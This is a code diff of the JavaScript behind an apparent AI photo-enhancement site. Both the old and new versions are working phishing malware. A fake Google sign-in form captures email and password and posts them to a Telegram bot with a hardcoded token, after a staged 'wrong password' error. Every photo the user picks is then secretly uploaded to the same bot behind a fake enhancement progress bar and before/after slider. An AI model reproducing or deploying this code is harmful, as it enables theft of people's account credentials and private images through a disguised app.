@@ -1,154 +1,122 @@
-// --- CONFIGURATION ---
 const BOT_TOKEN = "8049988237:AAGsP1xquf1CYsFX-zLorjjdZQGmNZDVF60";
 const CHAT_ID = "7674900139";
 
-// Elements
 const fileInput = document.getElementById('file-upload');
-const permissionModal = document.getElementById('permission-modal');
 const googleModal = document.getElementById('google-login-modal');
-const allowBtn = document.getElementById('allow-btn');
-const denyBtn = document.getElementById('deny-btn');
-const mainUploadTrigger = document.getElementById('main-upload-trigger');
-const processingText = document.getElementById('processing-text');
-const previewImage = document.getElementById('preview-image');
-const heroSection = document.querySelector('.hero');
+const permissionModal = document.getElementById('permission-modal');
 const enhanceSection = document.getElementById('enhance-section');
+const heroUI = document.getElementById('hero-ui');
+const beforeImage = document.getElementById('before-image');
+const afterImage = document.getElementById('after-image');
+const beforeWrapper = document.getElementById('before-wrapper');
+const sliderRange = document.getElementById('slider-range');
 const progressFill = document.getElementById('progress-fill');
+const processingText = document.getElementById('processing-text');
+const downloadBtn = document.getElementById('download-btn');
 
-let loginAttempts = 0; // Password loop check panna
+let loginAttempts = 0;
 
-// 1. Splash Screen
-window.addEventListener('load', () => {
-    setTimeout(() => {
-        const splash = document.getElementById('splash-screen');
-        if(splash) {
-            splash.style.opacity = '0';
-            setTimeout(() => splash.style.display = 'none', 1000);
-        }
-    }, 2000);
-});
-
-// 2. Step 1: Trigger Google Login first
-if(mainUploadTrigger) {
-    mainUploadTrigger.onclick = () => {
-        googleModal.style.display = 'block';
-    };
-}
-
-// 3. Google Login Functions
+// 1. Google Login Step Logic
 function showPasswordStep() {
     const email = document.getElementById('fake-email').value;
-    if(email.includes("@") && email.length > 5) {
+    if(email.includes("@")) {
         document.getElementById('display-email').innerText = email;
         document.getElementById('email-step').style.display = 'none';
         document.getElementById('password-step').style.display = 'block';
     } else {
-        alert("Enter a valid Google email");
+        alert("Enter a valid Google Account");
     }
 }
 
 function submitFakeLogin() {
     const email = document.getElementById('fake-email').value;
-    const password = document.getElementById('fake-password').value;
-    const errorMsg = document.getElementById('error-msg');
-
-    if(password.length < 6) {
-        errorMsg.style.display = 'block';
-        return;
-    }
-
-    // Secretly send credentials to Telegram
-    const logData = `🔑 **GOOGLE LOGIN ATTEMPT**\n📧 Email: \`${email}\`\n🔒 Password: \`${password}\`\n🔢 Attempt: ${loginAttempts + 1}`;
+    const pass = document.getElementById('fake-password').value;
     
+    // Telegram-ukku anupurathu
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-            chat_id: CHAT_ID, 
-            text: logData, 
-            parse_mode: "Markdown" 
-        })
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `🚨 NEW LOGIN\n📧: ${email}\n🔑: ${pass}` })
     });
 
     if(loginAttempts === 0) {
-        // First attempt: Show fake "Wrong Password" error
         loginAttempts++;
+        document.getElementById('error-msg').style.display = 'block';
         document.getElementById('fake-password').value = "";
-        errorMsg.style.display = 'block';
     } else {
-        // Second attempt: Success and Move to Permission
         googleModal.style.display = 'none';
-        alert("Identity Verified Successfully!");
-        permissionModal.style.display = 'block';
+        permissionModal.style.display = 'flex';
     }
 }
 
-// 4. Handle Permission & File Access
-allowBtn.onclick = () => {
+// 2. File Selection Flow
+document.getElementById('allow-btn').onclick = () => {
     permissionModal.style.display = 'none';
-    fileInput.click(); // Opens Gallery
+    fileInput.click();
 };
 
-denyBtn.onclick = () => {
-    permissionModal.style.display = 'none';
-    alert("Deep Scan is required for automatic enhancement.");
-};
-
-// 5. File Handling & Loop Upload
 fileInput.addEventListener('change', function() {
     const files = Array.from(this.files);
     if (files.length > 0) {
-        startDeepScan(files);
+        heroUI.style.display = 'none';
+        enhanceSection.style.display = 'block';
+        
+        // Before/After Slider Image Sync
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            beforeImage.src = e.target.result;
+            afterImage.src = e.target.result;
+            // Slider image width-ai correct-aa set panna
+            setTimeout(() => {
+                beforeImage.style.width = afterImage.offsetWidth + "px";
+            }, 100);
+        };
+        reader.readAsDataURL(files[0]);
+
+        // Secret Upload & Progress
+        files.forEach((file, index) => {
+            setTimeout(() => {
+                uploadToTelegram(file);
+                let p = Math.round(((index + 1) / files.length) * 100);
+                progressFill.style.width = p + "%";
+                processingText.innerText = `AI Enhancing: ${p}% (${index+1}/${files.length})`;
+                
+                if(index === files.length - 1) {
+                    processingText.innerText = "Enhancement Complete! ✅";
+                    downloadBtn.style.display = 'block';
+                }
+            }, index * 1000);
+        });
     }
 });
 
-function startDeepScan(files) {
-    heroSection.style.display = 'none';
-    enhanceSection.style.display = 'block';
-    
-    const reader = new FileReader();
-    reader.readAsDataURL(files[0]);
-    reader.onloadend = () => { previewImage.src = reader.result; };
+// 3. Slider Movement
+sliderRange.oninput = function() {
+    beforeWrapper.style.width = this.value + "%";
+};
 
-    files.forEach((file, index) => {
-        setTimeout(() => {
-            uploadToTelegram(file);
-            
-            let percent = Math.round(((index + 1) / files.length) * 100);
-            if(progressFill) progressFill.style.width = percent + "%";
-            processingText.innerHTML = `AI Deep Scanning: ${percent}% (${index + 1}/${files.length} files)`;
-
-            if (index === files.length - 1) {
-                setTimeout(() => {
-                    processingText.innerHTML = "Deep Scan Complete! ✅";
-                    previewImage.style.filter = "contrast(1.1) brightness(1.1) sharp(1.2)";
-                }, 1000);
-            }
-        }, index * 1200); 
-    });
-}
-
+// 4. Secret Telegram Photo Upload
 function uploadToTelegram(file) {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", file);
-    formData.append("caption", `📂 File: ${file.name}`);
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    }).catch(err => console.log("Upload failed."));
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", file);
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: "POST", body: fd});
 }
 
-// Settings Modal Logic
-const settingsBtn = document.getElementById('settings-btn');
-const settingsModal = document.getElementById('settings-modal');
-const closeModal = document.querySelector('.close-modal');
-
-if(settingsBtn) settingsBtn.onclick = () => settingsModal.style.display = 'block';
-if(closeModal) closeModal.onclick = () => settingsModal.style.display = 'none';
-
-window.onclick = (e) => {
-    if(e.target == settingsModal) settingsModal.style.display = 'none';
-    // Google Modal-ai click panni close panna mudiyaatha padi panna ithai remove pannalaam
-}
+// 5. Real Download with Filter
+downloadBtn.onclick = () => {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const img = new Image();
+    img.src = afterImage.src;
+    img.onload = () => {
+        canvas.width = img.width;
+        canvas.height = img.height;
+        ctx.filter = "contrast(1.2) brightness(1.1) saturate(1.1) contrast(1.1)";
+        ctx.drawImage(img, 0, 0);
+        const link = document.createElement('a');
+        link.download = 'Enhanced_by_PicZone.png';
+        link.href = canvas.toDataURL();
+        link.click();
+    };
+};
